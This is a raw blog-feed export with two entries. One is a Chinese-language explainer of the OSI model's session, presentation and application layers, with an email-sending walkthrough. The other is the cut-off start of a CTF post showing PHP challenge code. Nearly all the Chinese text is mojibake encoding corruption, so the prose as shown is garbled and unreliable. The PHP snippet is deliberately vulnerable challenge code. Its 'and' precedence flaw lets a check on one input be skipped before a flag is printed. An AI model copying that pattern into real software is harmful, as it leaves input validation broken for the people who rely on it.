è¾“å±‚å°†æ•°æ®åˆ†å‰²æˆè¾ƒå°çš„æ•°æ®ç‰‡ï¼ŒåŒæ—¶å¯¹æ¯ä¸€æ•°æ®ç‰‡å®‰æ’ä¸€åºåˆ—å·ï¼Œä»¥ä¾¿æ•°æ®åˆ°è¾¾æ¥æ”¶æ–¹èŠ‚ç‚¹çš„ä¼ è¾“å±‚æ—¶ï¼Œèƒ½ä»¥æ­£ç¡®çš„é¡ºåºé‡ç»„ã€‚è¯¥è¿‡ç¨‹å³è¢«ç§°ä¸ºæ’åºã€‚å·¥ä½œåœ¨ä¼ è¾“å±‚çš„ä¸€ç§æœåŠ¡æ˜¯TCP/IPåè®®å¥—ä¸­çš„TCP(ä¼ è¾“æ§åˆ¶åè®®)ï¼Œå¦ä¸€é¡¹ä¼ è¾“å±‚æœåŠ¡æ˜¯IPX/SPXåè®®é›†çš„SPX(åºåˆ—åŒ…äº¤æ¢)ã€‚<br>      ç½‘ç»œå±‚äº¤ç»™ä¼ è¾“å±‚åï¼Œä¼ è¾“å±‚å¿…éœ€æ ‡è¯†äº†æœåŠ¡æ˜¯å“ªä¸ªè¿›ç¨‹è¯·æ±‚çš„ï¼Œè¦äº¤ç»™è°çš„é—®é¢˜ã€‚æˆ‘æŠŠä¸œè¥¿äº¤ä½ æ—¶ï¼Œå¸Œæœ›é€šçŸ¥ä½ ä¸€ä¸‹ï¼Œå°±æ˜¯ä¼šè¯å±‚çš„å·¥ä½œã€‚<br>ã€€ã€€<strong>ã€è¿è¾“å±‚ä¸ºé¡¹ç›®æ€»æŒ‡æŒ¥ï¼šä¸»è¦ä»»åŠ¡ä¸ºå°†å¤§é¡¹ç›®åˆ†å‰²å¹¶æ ‡è¯†ä¸ºæœ‰åºçš„å°é¡¹ç›®ã€è§„å®šé¡¹ç›®å®Œæˆé€Ÿç‡ã€‚ã€‘</strong>
ã€€ã€€</p>
<hr>
<h3 id="ä¼šè¯å±‚"><a href="#ä¼šè¯å±‚" class="headerlink" title="ä¼šè¯å±‚"></a><strong>ä¼šè¯å±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¼šè¯å±‚ï¼ˆSession Layerï¼‰æ˜¯OSIå‚è€ƒæ¨¡å‹çš„ç¬¬äº”å±‚ã€‚ï¼ˆå³SPIï¼‰</span><br></pre></td></tr></table></figure></div>

<p>ã€€ã€€<code>è´Ÿè´£åœ¨ç½‘ç»œä¸­çš„ä¸¤èŠ‚ç‚¹ä¹‹é—´å»ºç«‹ã€ç»´æŒå’Œç»ˆæ­¢é€šä¿¡ã€‚</code></p>
<p>ã€€ã€€ ä¼šè¯å±‚çš„åŠŸèƒ½åŒ…æ‹¬ï¼šå»ºç«‹é€šä¿¡é“¾æ¥ï¼Œä¿æŒä¼šè¯è¿‡ç¨‹é€šä¿¡é“¾æ¥çš„ç•…é€šï¼ŒåŒæ­¥ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„å¯¹è¯ï¼Œå†³å®šé€šä¿¡æ˜¯å¦è¢«ä¸­æ–­ä»¥åŠé€šä¿¡ä¸­æ–­æ—¶å†³å®šä»ä½•å¤„é‡æ–°å‘é€ã€‚</p>
<p>ã€€ã€€ä½ å¯èƒ½å¸¸å¸¸å¬åˆ°æœ‰äººæŠŠä¼šè¯å±‚ç§°ä½œç½‘ç»œé€šä¿¡çš„â€œäº¤é€šè­¦å¯Ÿâ€ã€‚å½“é€šè¿‡æ‹¨å·å‘ä½ çš„ <code>ISP</code> ï¼ˆå› ç‰¹ç½‘æœåŠ¡æä¾›å•†ï¼‰è¯·æ±‚è¿æ¥åˆ°å› ç‰¹ç½‘æ—¶ï¼Œ<code>ISP æœåŠ¡å™¨</code>ä¸Šçš„ä¼šè¯å±‚å‘ä½ ä¸ä½ çš„ <code>PCå®¢æˆ·æœº</code> ä¸Šçš„ä¼šè¯å±‚è¿›è¡Œåå•†è¿æ¥ã€‚è‹¥ä½ çš„ç”µè¯çº¿å¶ç„¶ä»å¢™ä¸Šæ’å­”è„±è½æ—¶ï¼Œä½ ç»ˆç«¯æœºä¸Šçš„ä¼šè¯å±‚å°†æ£€æµ‹åˆ°è¿æ¥ä¸­æ–­å¹¶é‡æ–°å‘èµ·è¿æ¥ã€‚ä¼šè¯å±‚é€šè¿‡å†³å®šèŠ‚ç‚¹é€šä¿¡çš„ä¼˜å…ˆçº§å’Œé€šä¿¡æ—¶é—´çš„é•¿çŸ­æ¥è®¾ç½®é€šä¿¡æœŸé™ã€‚</p>
<p>ã€€ã€€SPIæ˜¯æœåŠ¡æä¾›è€…æ¥å£ï¼Œç®¡ç†ç”¨æˆ·é—´çš„ä¼šè¯å’Œå¯¹è¯ï¼›æ§åˆ¶ç”¨æˆ·é—´çš„è¿æ¥å’ŒæŒ‚æ–­è¿æ¥ï¼›æŠ¥å‘Šä¸Šå±‚é”™è¯¯</p>
<p>ã€€ã€€ä¸¤ä¸ªäººå¯¹è¯ï¼Œæˆ‘å’Œä½ è¯´è¯ï¼Œä½ è€³æœµå¬åˆ°äº†ä¹Ÿèƒ½ç†è§£ï¼Œä½†å¦‚æœå¯¹æ–¹æ˜¯å¤–å›½äººï¼Œä»–å¬åˆ°äº†æˆ‘çš„å£°éŸ³ï¼Œä»–ç†è§£äº†å—ï¼Ÿä»–ä¸èƒ½ç†è§£ã€‚é‚£å¯¹äºè®¡ç®—æœºç½‘ç»œæ¥è¨€ï¼Œå®¢æˆ·æœºå‘äº†ä¸€ä¸ªè¯·æ±‚ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨åº”è¯¥èƒ½ç†è§£è¿™ä¸ªè¯·æ±‚åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æ¥ä¸‹å»çš„é—®é¢˜æ˜¯ä½ æ€ä¹ˆæ ·ç†è§£ï¼Ÿè¿™ä¸ªç†è§£æœ‰ä¸¤ä¸ªå±‚æ¬¡ï¼Œæˆ‘è®²ä¸­å›½è¯ï¼Œä»–åªèƒ½æ‡‚è‹±æ–‡ï¼Œé‚£ä¹ˆè¿™å½“ä¸­åº”è¯¥æœ‰ä¸€ä¸ªç¿»è¯‘ã€‚æŠŠæ±‰è¯­ç¿»è¯‘æˆè‹±è¯­ï¼Œè¿™æ ·çš„å·¥ä½œå°±äº¤ç»™ä¸‹ä¸€å±‚è¡¨ç¤ºå±‚æ¥åšäº†ã€‚</p>
<hr>
<h3 id="è¡¨ç¤ºå±‚"><a href="#è¡¨ç¤ºå±‚" class="headerlink" title="è¡¨ç¤ºå±‚"></a><strong>è¡¨ç¤ºå±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¡¨ç¤ºå±‚ï¼ˆPresentation Layerï¼‰æ˜¯OSIå‚è€ƒæ¨¡å‹ä¸­çš„ç¬¬å…­å±‚ã€‚ï¼ˆAPIï¼‰</span><br></pre></td></tr></table></figure></div>

<p>ã€€ã€€æ˜¯åº”ç”¨ç¨‹åºå’Œç½‘ç»œä¹‹é—´çš„ç¿»è¯‘å®˜ï¼Œåœ¨è¡¨ç¤ºå±‚ï¼Œæ•°æ®å°†æŒ‰ç…§ç½‘ç»œèƒ½ç†è§£çš„æ–¹æ¡ˆè¿›è¡Œæ ¼å¼åŒ–ï¼›è¿™ç§æ ¼å¼åŒ–ä¹Ÿå› æ‰€ä½¿ç”¨ç½‘ç»œçš„ç±»å‹ä¸åŒè€Œä¸åŒã€‚è¡¨ç¤ºå±‚ç®¡ç†æ•°æ®çš„è§£å¯†ä¸åŠ å¯†ã€‚</p>
<p>ã€€ã€€å¦‚ç³»ç»Ÿå£ä»¤çš„å¤„ç†ã€‚ä¾‹å¦‚ï¼šåœ¨Internetä¸ŠæŸ¥è¯¢ä½ é“¶è¡Œè´¦æˆ·ï¼Œä½¿ç”¨çš„å³æ˜¯ä¸€ç§å®‰å…¨è¿æ¥ã€‚ä½ çš„è´¦æˆ·æ•°æ®åœ¨å‘é€å‰è¢«åŠ å¯†ï¼Œåœ¨ç½‘ç»œçš„å¦ä¸€ç«¯ï¼Œè¡¨ç¤ºå°†å¯¹æ¥æ”¶åˆ°çš„æ•°æ®è§£å¯†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¡¨ç¤ºå±‚åè®®è¿˜å¯¹å›¾ç‰‡å’Œæ–‡ä»¶æ ¼å¼ä¿¡æ¯è¿›è¡Œè§£ç å’Œç¼–ç ã€‚</p>
<p>ã€€ã€€å®ƒä¸ºåº”ç”¨ç¨‹åºæä¾›æ¥å£ã€‚APIè´Ÿè´£SPIä¸åº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡ï¼›å®šä¹‰ä¸åŒä½“ç³»é—´ä¸åŒæ•°æ®æ ¼å¼ï¼›å…·ä½“è¯´æ˜ç‹¬ç«‹ç»“æ„çš„æ•°æ®ä¼ è¾“æ ¼å¼ï¼›ç¼–ç å’Œè§£ç æ•°æ®ï¼›åŠ å¯†å’Œè§£å¯†æ•°æ®ï¼›å‹ç¼©å’Œè§£å‹ç¼©æ•°æ®ã€‚ 
ã€€ã€€</p>
<hr>
<h3 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a><strong>åº”ç”¨å±‚</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰æ˜¯OSIå‚è€ƒæ¨¡å‹ä¸­çš„æœ€é«˜å±‚ï¼Œå³ç¬¬ä¸ƒå±‚ã€‚</span><br></pre></td></tr></table></figure></div>
<p>ã€€ã€€å®ƒä¸ºåº”ç”¨ç¨‹åºæä¾›æœåŠ¡ä»¥ä¿è¯é€šä¿¡ï¼Œä½†ä¸æ˜¯è¿›è¡Œé€šä¿¡çš„åº”ç”¨ç¨‹åºæœ¬èº«ã€‚åº”ç”¨å±‚ç›´æ¥å’Œåº”ç”¨ç¨‹åºæ¥å£å¹¶æä¾›å¸¸è§çš„ç½‘ç»œåº”ç”¨æœåŠ¡ã€‚åº”ç”¨å±‚ä¹Ÿå‘è¡¨ç¤ºå±‚å‘å‡ºè¯·æ±‚ã€‚æ˜¯å¼€æ”¾ç³»ç»Ÿçš„æœ€é«˜å±‚,æ˜¯ç›´æ¥ä¸ºåº”ç”¨è¿›ç¨‹æä¾›æœåŠ¡çš„ã€‚å…¶ä½œç”¨æ˜¯åœ¨å®ç°å¤šä¸ªç³»ç»Ÿåº”ç”¨è¿›ç¨‹ç›¸äº’é€šä¿¡çš„åŒæ—¶ï¼Œå®Œæˆä¸€ç³»åˆ—ä¸šåŠ¡å¤„ç†æ‰€éœ€çš„æœåŠ¡ã€‚å…¶æœåŠ¡å…ƒç´ åˆ†ä¸ºä¸¤ç±»ï¼šå…¬å…±åº”ç”¨æœåŠ¡å…ƒç´ CASEå’Œç‰¹å®šåº”ç”¨æœåŠ¡å…ƒç´ SASEã€‚CASEæä¾›æœ€åŸºæœ¬çš„æœåŠ¡ï¼Œå®ƒæˆä¸ºåº”ç”¨å±‚ä¸­ä»»ä½•ç”¨æˆ·å’Œä»»ä½•æœåŠ¡å…ƒç´ çš„ç”¨æˆ·ï¼Œä¸»è¦ä¸ºåº”ç”¨è¿›ç¨‹é€šä¿¡ï¼Œåˆ†å¸ƒç³»ç»Ÿå®ç°æä¾›åŸºæœ¬çš„æ§åˆ¶æœºåˆ¶ï¼›ç‰¹å®šæœåŠ¡SASEåˆ™è¦æ»¡è¶³ä¸€äº›ç‰¹å®šæœåŠ¡ï¼Œå¦‚æ–‡å·ä¼ é€,è®¿é—®ç®¡ç†ï¼Œä½œä¸šä¼ é€,é“¶è¡Œäº‹åŠ¡,è®¢å•è¾“å…¥ç­‰ã€‚è¿™äº›å°†æ¶‰åŠåˆ°è™šæ‹Ÿç»ˆç«¯ï¼Œä½œä¸šä¼ é€ä¸æ“ä½œï¼Œæ–‡å·ä¼ é€åŠè®¿é—®ç®¡ç†,è¿œç¨‹æ•°æ®åº“è®¿é—®ï¼Œå›¾å½¢æ ¸å¿ƒç³»ç»Ÿï¼Œå¼€æ”¾ç³»ç»Ÿäº’è¿ç®¡ç†ç­‰ç­‰ã€‚</p>
<p>å°ç»“ï¼š</p>
<ul>
<li><p><strong>ç‰©ç†å±‚</strong>ï¼šä¸»è¦å®šä¹‰ç‰©ç†è®¾å¤‡æ ‡å‡†ï¼Œå¦‚ç½‘çº¿çš„æ¥å£ç±»å‹ã€å…‰çº¤çš„æ¥å£ç±»å‹ã€å„ç§ä¼ è¾“ä»‹è´¨çš„ä¼ è¾“é€Ÿç‡ç­‰ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ä¼ è¾“æ¯”ç‰¹æµï¼ˆå°±æ˜¯ç”±1ã€0è½¬åŒ–ä¸ºç”µæµå¼ºå¼±æ¥è¿›è¡Œä¼ è¾“,åˆ°è¾¾ç›®çš„åœ°ååœ¨è½¬åŒ–ä¸º1ã€0ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„æ¨¡æ•°è½¬æ¢ä¸æ•°æ¨¡è½¬æ¢ï¼‰ã€‚è¿™ä¸€å±‚çš„æ•°æ®å«åšæ¯”ç‰¹ã€‚ ã€€ã€€</p>
</li>
<li><p><strong>æ•°æ®é“¾è·¯å±‚</strong>ï¼šä¸»è¦å°†ä»ç‰©ç†å±‚æ¥æ”¶çš„æ•°æ®è¿›è¡ŒMACåœ°å€ï¼ˆç½‘å¡çš„åœ°å€ï¼‰çš„å°è£…ä¸è§£å°è£…ã€‚å¸¸æŠŠè¿™ä¸€å±‚çš„æ•°æ®å«åšå¸§ã€‚åœ¨è¿™ä¸€å±‚å·¥ä½œçš„è®¾å¤‡æ˜¯äº¤æ¢æœºï¼Œæ•°æ®é€šè¿‡äº¤æ¢æœºæ¥ä¼ è¾“ã€‚ </p>
</li>
<li><p><strong>ç½‘ç»œå±‚</strong>ï¼šä¸»è¦å°†ä»ä¸‹å±‚æ¥æ”¶åˆ°çš„æ•°æ®è¿›è¡ŒIPåœ°å€ï¼ˆä¾‹192.168.0.1)çš„å°è£…ä¸è§£å°è£…ã€‚åœ¨è¿™ä¸€å±‚å·¥ä½œçš„è®¾å¤‡æ˜¯è·¯ç”±å™¨ï¼Œå¸¸æŠŠè¿™ä¸€å±‚çš„æ•°æ®å«åšæ•°æ®åŒ…ã€‚ </p>
</li>
<li><p><strong>ä¼ è¾“å±‚</strong>ï¼šå®šä¹‰äº†ä¸€äº›ä¼ è¾“æ•°æ®çš„åè®®å’Œç«¯å£å·ï¼ˆWWWç«¯å£80ç­‰ï¼‰ï¼Œå¦‚ï¼šTCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼Œä¼ è¾“æ•ˆç‡ä½ï¼Œå¯é æ€§å¼ºï¼Œç”¨äºä¼ è¾“å¯é æ€§è¦æ±‚é«˜ï¼Œæ•°æ®é‡å¤§çš„æ•°æ®ï¼‰ï¼ŒUDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼Œä¸TCPç‰¹æ€§æ°æ°ç›¸åï¼Œç”¨äºä¼ è¾“å¯é æ€§è¦æ±‚ä¸é«˜ï¼Œæ•°æ®é‡å°çš„æ•°æ®ï¼Œå¦‚QQèŠå¤©æ•°æ®å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ä¼ è¾“çš„ï¼‰ã€‚ ä¸»è¦æ˜¯å°†ä»ä¸‹å±‚æ¥æ”¶çš„æ•°æ®è¿›è¡Œåˆ†æ®µè¿›è¡Œä¼ è¾“ï¼Œåˆ°è¾¾ç›®çš„åœ°å€ååœ¨è¿›è¡Œé‡ç»„ã€‚å¸¸å¸¸æŠŠè¿™ä¸€å±‚æ•°æ®å«åšæ®µã€‚ ã€€ã€€</p>
</li>
<li><p><strong>ä¼šè¯å±‚</strong>ï¼šé€šè¿‡ä¼ è¾“å±‚ï¼ˆç«¯å£å·ï¼šä¼ è¾“ç«¯å£ä¸æ¥æ”¶ç«¯å£ï¼‰å»ºç«‹æ•°æ®ä¼ è¾“çš„é€šè·¯ã€‚ä¸»è¦åœ¨ä½ çš„ç³»ç»Ÿä¹‹é—´å‘èµ·ä¼šè¯æˆ–æˆ–è€…æ¥å—ä¼šè¯è¯·æ±‚ï¼ˆè®¾å¤‡ä¹‹é—´éœ€è¦äº’ç›¸è®¤è¯†å¯ä»¥æ˜¯IPä¹Ÿå¯ä»¥æ˜¯MACæˆ–è€…æ˜¯ä¸»æœºåï¼‰ </p>
</li>
<li><p><strong>è¡¨ç¤ºå±‚</strong>ï¼šä¸»è¦æ˜¯è¿›è¡Œå¯¹æ¥æ”¶çš„æ•°æ®è¿›è¡Œè§£é‡Šã€åŠ å¯†ä¸è§£å¯†ã€å‹ç¼©ä¸è§£å‹ç¼©ç­‰ï¼ˆä¹Ÿå°±æ˜¯æŠŠè®¡ç®—æœºèƒ½å¤Ÿè¯†åˆ«çš„ä¸œè¥¿è½¬æ¢æˆäººèƒ½å¤Ÿèƒ½è¯†åˆ«çš„ä¸œè¥¿ï¼ˆå¦‚å›¾ç‰‡ã€å£°éŸ³ç­‰ï¼‰ï¼‰ ã€€ã€€</p>
</li>
<li><p><strong>åº”ç”¨å±‚</strong>ï¼šä¸»è¦æ˜¯ä¸€äº›ç»ˆç«¯çš„åº”ç”¨ï¼Œæ¯”å¦‚è¯´FTPï¼ˆå„ç§æ–‡ä»¶ä¸‹è½½ï¼‰ï¼ŒWEBï¼ˆIEæµè§ˆï¼‰ï¼ŒQQä¹‹ç±»çš„ï¼ˆä½ å°±æŠŠå®ƒç†è§£æˆæˆ‘ä»¬åœ¨ç”µè„‘å±å¹•ä¸Šå¯ä»¥çœ‹åˆ°çš„ä¸œè¥¿ï¼å°± æ˜¯ç»ˆç«¯åº”ç”¨ï¼‰ã€‚</p>
</li>
</ul>
<hr>
<h2 id="ä¸¾ä¸ªå‘é‚®ä»¶ä¾‹å­"><a href="#ä¸¾ä¸ªå‘é‚®ä»¶ä¾‹å­" class="headerlink" title="ä¸¾ä¸ªå‘é‚®ä»¶ä¾‹å­"></a>ä¸¾ä¸ªå‘é‚®ä»¶ä¾‹å­</h2><p>ã€€æœºAå‘ä¸»æœºBå‘é€æ•°æ®ï¼Œè¯¥æ•°æ®çš„äº§ç”Ÿè‚¯å®šæ˜¯ä¸€ä¸ªåº”ç”¨å±‚çš„ç¨‹åºäº§ç”Ÿçš„ï¼Œå¦‚IEæµè§ˆå™¨æˆ–è€…Emailçš„å®¢æˆ·ç«¯ç­‰ç­‰ã€‚è¿™äº›ç¨‹åºåœ¨åº”ç”¨å±‚éœ€è¦æœ‰ä¸åŒçš„æ¥å£ï¼ŒIEæ˜¯æµè§ˆç½‘é¡µçš„ä½¿ç”¨HTTPåè®®ï¼Œé‚£ä¹ˆHTTPåº”ç”¨å±‚ä¸ºæµè§ˆç½‘é¡µçš„è½¯ä»¶ç•™ä¸‹çš„ç½‘ç»œæ¥å£ã€‚Emailå®¢æˆ·ç«¯ä½¿ç”¨smtpå’Œpop3 åè®®æ¥æ”¶å‘ç”µå­é‚®ä»¶ï¼Œæ‰€ä»¥smtpå’Œpop3å°±æ˜¯åº”ç”¨å±‚ä¸ºç”µå­é‚®ä»¶çš„è½¯ä»¶ç•™ä¸‹çš„æ¥å£ã€‚</p>
<hr>
<p>ã€€ã€€å®ä¾‹ï¼š</p>
<h3 id="1ã€åº”ç”¨å±‚"><a href="#1ã€åº”ç”¨å±‚" class="headerlink" title="1ã€åº”ç”¨å±‚"></a>1ã€åº”ç”¨å±‚</h3><p>ã€€ã€€æˆ‘ä»¬å‡è®¾Aå‘Bå‘é€äº†ä¸€å°ç”µå­é‚®ä»¶ï¼Œå› æ­¤ä¸»æœºAä¼šä½¿ç”¨smtpåè®®æ¥å¤„ç†è¯¥æ•°æ®ï¼Œå³åœ¨æ•°æ®å‰åŠ ä¸ŠSMTPçš„æ ‡è®°ï¼Œä»¥ä¾¿ä½¿å¯¹ç«¯åœ¨æ”¶åˆ°åçŸ¥é“ä½¿ç”¨ä»€ä¹ˆè½¯ä»¶æ¥å¤„ç†è¯¥æ•°æ®ã€‚</p>
<h3 id="2ã€è¡¨ç¤ºå±‚"><a href="#2ã€è¡¨ç¤ºå±‚" class="headerlink" title="2ã€è¡¨ç¤ºå±‚"></a>2ã€è¡¨ç¤ºå±‚</h3><p>ã€€ã€€åº”ç”¨å±‚å°†æ•°æ®å¤„ç†å®Œæˆåä¼šäº¤ç»™è¡¨ç¤ºå±‚ï¼Œè¡¨ç¤ºå±‚ä¼šè¿›è¡Œå¿…è¦çš„æ ¼å¼è½¬æ¢ï¼Œä½¿ç”¨ä¸€ç§é€šä¿¡åŒæ–¹éƒ½èƒ½è¯†åˆ«çš„ç¼–ç æ¥å¤„ç†è¯¥æ•°æ®ã€‚</p>
<p>ã€€ã€€åŒæ—¶å°†å¤„ç†æ•°æ®çš„æ–¹æ³•æ·»åŠ åœ¨æ•°æ®ä¸­ï¼Œä»¥ä¾¿å¯¹ç«¯çŸ¥é“æ€æ ·å¤„ç†æ•°æ®ã€‚</p>
<h3 id="3ã€ä¼šè¯å±‚"><a href="#3ã€ä¼šè¯å±‚" class="headerlink" title="3ã€ä¼šè¯å±‚"></a>3ã€ä¼šè¯å±‚</h3><p>ã€€ã€€è¡¨ç¤ºå±‚å¤„ç†å®Œæˆåï¼Œå°†æ•°æ®äº¤ç»™ä¼šè¯å±‚ï¼Œä¼šè¯å±‚ä¼šåœ¨Aä¸»æœºå’ŒBä¸»æœºä¹‹é—´å»ºç«‹ä¸€æ¡åªç”¨äºä¼ è¾“è¯¥æ•°æ®çš„ä¼šè¯é€šé“ï¼Œå¹¶ç›‘è§†å®ƒçš„è¿æ¥çŠ¶æ€ï¼Œç›´åˆ°æ•°æ®åŒæ­¥å®Œæˆï¼Œæ–­å¼€è¯¥ä¼šè¯ã€‚</p>
<p>ã€€ã€€æ³¨æ„ï¼šAå’ŒBä¹‹é—´å¯ä»¥åŒæ—¶æœ‰å¤šæ¡ä¼šè¯é€šé“å‡ºç°ï¼Œä½†æ¯ä¸€æ¡éƒ½å’Œå…¶ä»–çš„ä¸èƒ½æ··æ·†ã€‚ä¼šè¯å±‚çš„ä½œç”¨å°±æ˜¯æœ‰åŠæ³•æ¥åŒºåˆ«ä¸åŒçš„ä¼šè¯é€šé“ã€‚</p>
<h3 id="4ã€ä¼ è¾“å±‚"><a href="#4ã€ä¼ è¾“å±‚" class="headerlink" title="4ã€ä¼ è¾“å±‚"></a>4ã€ä¼ è¾“å±‚</h3><p>ã€€ã€€ä¼šè¯é€šé“å»ºç«‹åï¼Œä¸ºäº†ä¿è¯æ•°æ®ä¼ è¾“ä¸­çš„å¯é æ€§ï¼Œå°±éœ€è¦åœ¨æ•°æ®ä¼ è¾“çš„æ„æˆå½“ä¸­å¯¹æ•°æ®è¿›è¡Œä¸è¦çš„å¤„ç†ï¼Œå¦‚åˆ†æ®µï¼Œç¼–å·ï¼Œå·®é”™æ ¡éªŒï¼Œç¡®è®¤ã€é‡ä¼ ç­‰ç­‰ã€‚</p>
<p>ã€€ã€€è¿™äº›æ–¹æ³•çš„å®ç°å¿…é¡»ä¾èµ–é€šä¿¡åŒæ–¹çš„æ§åˆ¶ï¼Œä¼ è¾“å±‚çš„ä½œç”¨å°±æ˜¯åœ¨é€šä¿¡åŒæ–¹ä¹‹é—´åˆ©ç”¨ä¸Šé¢çš„ä¼šè¯é€šé“ä¼ è¾“æ§åˆ¶ä¿¡æ¯ï¼Œå®Œæˆæ•°æ®çš„å¯é ä¼ è¾“ã€‚</p>
<h3 id="5ã€ç½‘ç»œå±‚"><a href="#5ã€ç½‘ç»œå±‚" class="headerlink" title="5ã€ç½‘ç»œå±‚"></a>5ã€ç½‘ç»œå±‚</h3><p>ã€€ã€€ç½‘ç»œå±‚æ˜¯å®é™…ä¼ è¾“æ•°æ®çš„å±‚æ¬¡ï¼Œåœ¨ç½‘ç»œå±‚ä¸­å¿…é¡»è¦å°†ä¼ è¾“å±‚ä¸­å¤„ç†å®Œæˆçš„æ•°æ®å†æ¬¡å°è£…ï¼Œæ·»åŠ ä¸Šè‡ªå·±çš„åœ°å€ä¿¡æ¯å’Œå¯¹ç«¯æ¥å—è€…çš„åœ°å€ä¿¡æ¯ï¼Œå¹¶ä¸”è¦åœ¨ç½‘ç»œä¸­æ‰¾åˆ°ä¸€æ¡ç”±è‡ªå·±åˆ°æ¥æ”¶è€…æœ€å¥½çš„è·¯å¾„ã€‚ç„¶åæŒ‰ç…§æœ€ä½³è·¯å¾„å‘é€åˆ°ç½‘ç»œä¸­ã€‚</p>
<h3 id="6ã€æ•°æ®é“¾è·¯å±‚"><a href="#6ã€æ•°æ®é“¾è·¯å±‚" class="headerlink" title="6ã€æ•°æ®é“¾è·¯å±‚"></a>6ã€æ•°æ®é“¾è·¯å±‚</h3><p>ã€€ã€€æ•°æ®é“¾è·¯å±‚å°†ç½‘ç»œå±‚çš„æ•°æ®å†æ¬¡è¿›è¡Œå°è£…ï¼Œè¯¥å±‚ä¼šæ·»åŠ èƒ½å”¯ä¸€æ ‡è¯†æ¯å°è®¾å¤‡çš„åœ°å€ä¿¡æ¯ï¼ˆMACåœ°å€ï¼‰ï¼Œæ˜¯è¿™ä¸ªæ•°æ®åœ¨ç›¸é‚»çš„ä¸¤ä¸ªè®¾å¤‡ä¹‹é—´ä¸€æ®µä¸€æ®µçš„ä¼ è¾“ã€‚æœ€ç»ˆåˆ°è¾¾ç›®çš„åœ°ã€‚</p>
<h3 id="7ã€ç‰©ç†å±‚"><a href="#7ã€ç‰©ç†å±‚" class="headerlink" title="7ã€ç‰©ç†å±‚"></a>7ã€ç‰©ç†å±‚</h3><p>ã€€ã€€ç‰©ç†å±‚å°†æ•°æ®é“¾è·¯å±‚çš„æ•°æ®è½¬æ¢æˆç”µæµä¼ è¾“çš„ç‰©ç†çº¿è·¯ã€‚</p>
<p>ã€€ã€€é€šè¿‡ç‰©ç†çº¿è·¯ä¼ é€’çš„Bä¸»æœºåï¼ŒBä¸»æœºä¼šå°†ç”µä¿¡å·è½¬æ¢æˆæ•°æ®é“¾è·¯å±‚çš„æ•°æ®ï¼Œæ•°æ®é“¾è·¯å±‚å†å»æ‰æœ¬å±‚çš„ç¡¬ä»¶åœ°å€ä¿¡æ¯å’Œå…¶ä»–çš„å¯¹ç«¯æ·»åŠ çš„å†…å®¹ä¸Šäº¤ç»™ç½‘ç»œå±‚ï¼Œç½‘ç»œå±‚åŒæ ·å»æ‰å¯¹ç«¯ç½‘ç»œå±‚æ·»åŠ çš„å†…å®¹åä¸Šäº¤ç»™è‡ªå·±çš„ä¸Šå±‚ã€‚æœ€ç»ˆæ•°æ®åˆ°è¾¾Bä¸»æœºçš„åº”ç”¨å±‚ï¼Œåº”ç”¨å±‚çœ‹åˆ°æ•°æ®ä½¿ç”¨smtpåè®®å°è£…ï¼Œå°±çŸ¥é“åº”ç”¨ç”µå­é‚®ä»¶çš„è½¯ä»¶æ¥å¤„ç†ã€‚</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä¸€é“é¢˜äº†è§£æ¨¡å¼ä¿®æ­£ç¬¦</title>
    <url>/yakko117/2019/12/28/%E6%A8%A1%E5%BC%8F%E4%BF%AE%E6%AD%A3%E7%AC%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$num=$_GET[<span class="string">'num'</span>]; </span><br><span class="line">$str=$_GET[<span class="string">'str'</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($num)&amp;&amp;<span class="keyword">isset</span>($str)) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\d+/sD'</span>,$str)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You play CTF like CXK!"</span>; </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    $result=is_numeric($num) <span class="keyword">and</span> is_numeric($str);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123; </span><br><span class="line">        <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Just because you're beautiful!"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span>You play CTF like 